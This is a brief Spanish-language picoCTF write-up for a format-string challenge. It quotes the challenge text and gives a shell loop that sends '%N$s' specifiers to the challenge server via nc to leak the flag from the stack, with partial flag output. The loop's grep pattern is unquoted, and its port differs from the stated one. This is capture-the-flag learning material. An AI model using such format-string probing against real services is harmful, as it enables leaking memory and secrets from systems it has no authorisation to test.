# Objetivo

Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/93/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/93/vuln.c). And connect with it using: `nc saturn.picoctf.net 59724`

# Solucion

nos conectamos al servidor y ejecutamos el siguiente comando y nos dara la bandera  

```shell
┌──(kali㉿kali)-[~]
└─$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 59055 | grep -Ei (pico|ctf); done
CTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_


```

# Notas adicionales

# Referencias